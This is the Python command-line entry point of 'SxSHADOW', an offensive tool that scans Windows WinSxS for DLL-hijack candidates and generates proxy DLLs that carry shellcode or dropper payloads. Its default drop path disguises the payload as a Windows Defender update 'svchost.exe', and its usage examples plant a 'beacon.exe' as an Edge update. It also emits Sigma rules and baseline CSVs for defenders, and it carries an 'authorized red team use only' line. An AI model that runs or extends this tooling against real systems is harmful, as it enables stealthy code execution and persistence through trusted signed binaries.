#!/usr/bin/env python3
"""
SxSHADOW — Component Store Hijack Automated Discovery & Weaponization
======================================================================
Automatically enumerates every EXE in C:\\Windows\\WinSxS, parses import
tables via pefile (no execution required), cross-references against the
Windows KnownDLLs registry key, and ranks hijack candidates by a
composite trust/ease/impact score.

Sub-commands
------------
  scan   Enumerate WinSxS and display/save ranked candidates.
  forge  Generate proxy DLL source for a specific (binary, DLL) pair.
  auto   Scan + forge the top-scoring candidate in one step.

Examples
--------
  python sxshadow.py scan
  python sxshadow.py scan --arch x64 --top 10 --json results.json
  python sxshadow.py scan --no-sign-check --html report.html

  python sxshadow.py forge --binary ngentask.exe --dll mscorsvc.dll
  python sxshadow.py forge --binary ngentask.exe --dll mscorsvc.dll \\
         --payload-type exe-dropper --payload beacon.exe \\
         --drop-path "C:\\ProgramData\\EdgeUpdate\\update.exe"

  python sxshadow.py auto --arch x64 --payload-type shellcode --payload sc.bin

Authorized red team use only.
"""
from __future__ import annotations

import sys

# Force UTF-8 output on Windows so Rich box-drawing characters don't crash
# on legacy cp1252 consoles (PowerShell, old cmd.exe).
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import argparse
from pathlib import Path

from rich.console import Console

from core            import HijackCandidate
from core.pe_parser  import get_publisher, sha256_file
from core.scanner    import scan, WINSXS_PATH
from forge.proxy_gen import forge_proxy, PayloadType
from output.reporter import (print_banner, print_results,
                              print_candidate_detail, save_json, save_html)
from output.packager import create_package
from output.sigma     import emit_sigma
from output.csv_export import emit_csv, emit_baseline_csv

console = Console()


# ── Operator metadata hydration ──────────────────────────────────────────────
#
# cmd_forge and cmd_auto only ever package one candidate, but a full scan
# computes hashes/publishers for every binary in WinSxS. We short-circuit by
# asking the scanner to skip those (collect_hashes=False) and then hydrate
# just the one we picked. This keeps the operator README/panel rich without
# paying for thousands of files we'll never use.

def _hydrate_operator_metadata(c: HijackCandidate) -> None:
    """Fill in publisher + hashes for a single candidate, in place."""
    if c.binary_sha256 is None:
        c.binary_sha256 = sha256_file(c.binary_path)
    if c.real_dll_sha256 is None and c.real_dll_path is not None:
        c.real_dll_sha256 = sha256_file(c.real_dll_path)
    if c.binary_publisher is None and c.binary_signed is True:
        c.binary_publisher = get_publisher(c.binary_path)


# ── Argument parser ───────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="sxshadow",
        description="SxSHADOW — WinSxS DLL hijack discovery and proxy forge",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = p.add_subparsers(dest="command", required=False)

    # ── scan ──────────────────────────────────────────────────────────────────
    sp = sub.add_parser("scan", help="Enumerate WinSxS hijack candidates")
    sp.add_argument(
        "--arch", choices=["x64", "x86"], default=None,
        help="Filter by architecture (default: both)",
    )
    sp.add_argument(
        "--top", type=int, default=20, metavar="N",
        help="Display top-N candidates in console (default: 20)",
    )
    sp.add_argument(
        "--max", type=int, default=None, metavar="N",
        help="Cap total candidates returned (default: unlimited)",
    )
    sp.add_argument(
        "--workers", type=int, default=8, metavar="N",
        help="Parallel PE-parsing threads (default: 8)",
    )
    sp.add_argument(
        "--no-sign-check", action="store_true",
        help="Skip Authenticode signature check (faster, loses trust score accuracy)",
    )
    sp.add_argument(
        "--json", type=Path, metavar="FILE",
        help="Also save results to a JSON file",
    )
    sp.add_argument(
        "--html", type=Path, metavar="FILE",
        help="Also save results to an HTML report",
    )
    sp.add_argument(
        "--detail", type=int, default=None, metavar="N",
        help="Print full detail panel for candidate number N",
    )
    # ── Defensive output (for blue-team / threat-hunting consumers) ──────────
    sp.add_argument(
        "--sigma", type=Path, metavar="FILE",
        help="Emit Sigma detection rules (image_load + process_create) to FILE",
    )
    sp.add_argument(
        "--sigma-min-priority", type=int, default=30, metavar="N",
        help="Only emit Sigma rules for candidates with defensive_priority >= N "
             "(default: 30)",
    )
    sp.add_argument(
        "--csv", type=Path, metavar="FILE",
        help="Emit SIEM-ready CSV with hashes, publisher, defensive priority "
             "and MITRE T1574.002 mapping",
    )
    sp.add_argument(
        "--baseline-csv", type=Path, metavar="FILE",
        help="Emit 'expected good' baseline CSV (host SHA256 + expected DLL "
             "paths/hashes) for integrity monitoring",
    )
    sp.add_argument(
        "--no-dlls", action="store_true",
        help="Skip DLL hosts inside WinSxS (only scan EXEs)",
    )
    sp.add_argument(
        "--collect-publisher", action="store_true",
        help="Resolve Authenticode publisher CN per signed binary "
             "(expensive — spawns PowerShell)",
    )
    sp.add_argument(
        "--no-hashes", action="store_true",
        help="Skip SHA-256 computation (faster, loses baseline value)",
    )
    sp.set_defaults(func=cmd_scan)

    # ── forge ─────────────────────────────────────────────────────────────────
    fp = sub.add_parser(
        "forge",
        help="Generate proxy DLL source for a specific (binary, DLL) pair",
    )
    fp.add_argument("--binary", required=True, metavar="NAME",
                    help="Host binary name (e.g. ngentask.exe)")
    fp.add_argument("--dll",    required=True, metavar="NAME",
                    help="Hijackable DLL name (e.g. mscorsvc.dll)")
    fp.add_argument(
        "--arch", choices=["x64", "x86"], default=None,
        help="Disambiguate when the same binary name exists in both architectures",
    )
    fp.add_argument(
        "--payload-type",
        choices=[t.value for t in PayloadType],
        default=PayloadType.STUB.value,
        help="Payload mode (default: stub)",
    )
    fp.add_argument("--payload", type=Path, metavar="FILE",
                    help="Raw payload file (.bin / .exe / .dll)")
    fp.add_argument(
        "--drop-path",
        default=r"C:\ProgramData\WindowsDefenderUpdate\svchost.exe",
        metavar="PATH",
        help="On-disk drop path for exe-dropper / dll-load modes",
    )
    fp.add_argument("--out", type=Path, default=Path("output"),
                    metavar="DIR", help="Output directory (default: ./output)")
    fp.set_defaults(func=cmd_forge)

    # ── auto ──────────────────────────────────────────────────────────────────
    ap = sub.add_parser(
        "auto",
        help="Scan WinSxS and forge the top-scoring candidate automatically",
    )
    ap.add_argument("--arch",    choices=["x64", "x86"], default=None)
    ap.add_argument("--workers", type=int, default=8, metavar="N")
    ap.add_argument("--no-sign-check", action="store_true")
    ap.add_argument(
        "--payload-type",
        choices=[t.value for t in PayloadType],
        default=PayloadType.STUB.value,
    )
    ap.add_argument("--payload", type=Path, metavar="FILE")
    ap.add_argument(
        "--drop-path",
        default=r"C:\ProgramData\WindowsDefenderUpdate\svchost.exe",
        metavar="PATH",
    )
    ap.add_argument("--out", type=Path, default=Path("output"), metavar="DIR")
    ap.set_defaults(func=cmd_auto)

    return p


# ── Sub-command handlers ──────────────────────────────────────────────────────

def cmd_scan(args: argparse.Namespace) -> int:
    print_banner(console)
    console.print(f"[dim]  WinSxS path : {WINSXS_PATH}[/dim]")
    console.print(f"[dim]  Arch filter : {args.arch or 'x64 + x86'}[/dim]")
    console.print(f"[dim]  Sign check  : {not args.no_sign_check}[/dim]\n")

    result = scan(
        winsxs_path=WINSXS_PATH,
        arch_filter=args.arch,
        max_workers=args.workers,
        sign_check=not args.no_sign_check,
        max_candidates=args.max,
        top_n=args.top,
        include_dlls=not args.no_dlls,
        collect_publisher=args.collect_publisher,
        collect_hashes=not args.no_hashes,
    )

    if not result.candidates:
        console.print("[yellow][!] No hijackable candidates found.[/yellow]")
        return 1

    print_results(result, console, top_n=args.top)

    if args.detail is not None:
        idx = args.detail - 1
        if 0 <= idx < len(result.candidates):
            print_candidate_detail(result.candidates[idx], console)
        else:
            console.print(f"[red][!] Candidate #{args.detail} out of range.[/red]")

    if args.json:
        save_json(result, args.json)
        console.print(f"[green][+][/green] JSON saved   → {args.json}")

    if args.html:
        save_html(result, args.html)
        console.print(f"[green][+][/green] HTML saved   → {args.html}")

    if args.csv:
        n = emit_csv(result, args.csv)
        console.print(f"[green][+][/green] CSV saved    → {args.csv} ({n} rows)")

    if args.baseline_csv:
        n = emit_baseline_csv(result.candidates, args.baseline_csv)
        console.print(f"[green][+][/green] Baseline CSV → {args.baseline_csv} ({n} rows)")

    if args.sigma:
        n = emit_sigma(result.candidates, args.sigma,
                       min_priority=args.sigma_min_priority)
        console.print(f"[green][+][/green] Sigma rules  → {args.sigma} ({n} rules)")

    return 0


def cmd_forge(args: argparse.Namespace) -> int:
    """
    Forge a proxy DLL for an explicitly specified (binary, dll) pair.
    Performs a targeted scan to find the binary in WinSxS and collect
    real DLL exports, then calls forge_proxy() + create_package().
    """
    print_banner(console)
    console.print(f"[cyan][*][/cyan] Forging proxy for "
                  f"[bold]{args.binary}[/bold] / [yellow]{args.dll}[/yellow] ...")

    # Restrict the scan to what's strictly needed for a forge run:
    #   - arch_filter when the operator specifies one (resolves ambiguity)
    #   - include_dlls iff the requested host is a .dll (otherwise EXE-only)
    #   - collect_hashes=False (we hydrate just the chosen candidate below)
    suffix       = Path(args.binary).suffix.lower()
    include_dlls = suffix in ("", ".dll")
    # No max_candidates cap — the target binary could be anywhere alphabetically
    # in WinSxS; a cap triggers early_stop which may miss it entirely.
    result = scan(
        winsxs_path=WINSXS_PATH,
        arch_filter=args.arch,
        sign_check=True,
        max_candidates=None,
        include_dlls=include_dlls,
        collect_hashes=False,
    )

    # Find matching candidate (optionally filter by arch as well)
    binary_lower = args.binary.lower()
    dll_lower    = args.dll.lower()
    candidate    = next(
        (c for c in result.candidates
         if c.binary_name.lower() == binary_lower
         and c.hijackable_dll.lower() == dll_lower
         and (args.arch is None or c.binary_arch == args.arch)),
        None,
    )

    if candidate is None:
        console.print(
            f"[red][!] No candidate found for {args.binary} / {args.dll}"
            f"{' (' + args.arch + ')' if args.arch else ''}.[/red]\n"
            f"    Run 'sxshadow.py scan' first to see available candidates."
        )
        return 1

    _hydrate_operator_metadata(candidate)
    print_candidate_detail(candidate, console)

    payload_type = PayloadType(args.payload_type)
    bundle = forge_proxy(
        candidate=candidate,
        payload_type=payload_type,
        payload_path=args.payload,
        drop_path=args.drop_path,
        output_dir=args.out / Path(candidate.hijackable_dll).stem,
    )
    pkg = create_package(candidate, bundle, args.out)
    console.print(pkg.summary())
    return 0


def cmd_auto(args: argparse.Namespace) -> int:
    """Scan WinSxS and immediately forge the top-scoring candidate."""
    print_banner(console)
    console.print("[cyan][*][/cyan] Running full scan ...")

    # collect_hashes=False because we only need hashes for the one we pick.
    # That post-hoc hydration happens after rank() returns the top candidate.
    result = scan(
        winsxs_path=WINSXS_PATH,
        arch_filter=args.arch,
        max_workers=args.workers,
        sign_check=not args.no_sign_check,
        max_candidates=50,
        collect_hashes=False,
    )

    if not result.candidates:
        console.print("[yellow][!] No hijackable candidates found.[/yellow]")
        return 1

    best = result.candidates[0]
    console.print(
        f"[green][+][/green] Top candidate: "
        f"[bold]{best.binary_name}[/bold] / [yellow]{best.hijackable_dll}[/yellow] "
        f"(score {best.score})"
    )
    _hydrate_operator_metadata(best)
    print_candidate_detail(best, console)

    payload_type = PayloadType(args.payload_type)
    bundle = forge_proxy(
        candidate=best,
        payload_type=payload_type,
        payload_path=args.payload,
        drop_path=args.drop_path,
        output_dir=args.out / Path(best.hijackable_dll).stem,
    )
    pkg = create_package(best, bundle, args.out)
    console.print(pkg.summary())
    return 0


# ── Entry point ───────────────────────────────────────────────────────────────

def main() -> int:
    if sys.platform != "win32":
        Console(stderr=True).print(
            "[red][!][/red] SxSHADOW requires Windows (WinSxS only exists there)."
        )
        return 2

    parser = build_parser()
    args   = parser.parse_args()

    if not args.command:
        print_banner(console)
        parser.print_help()
        return 0

    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
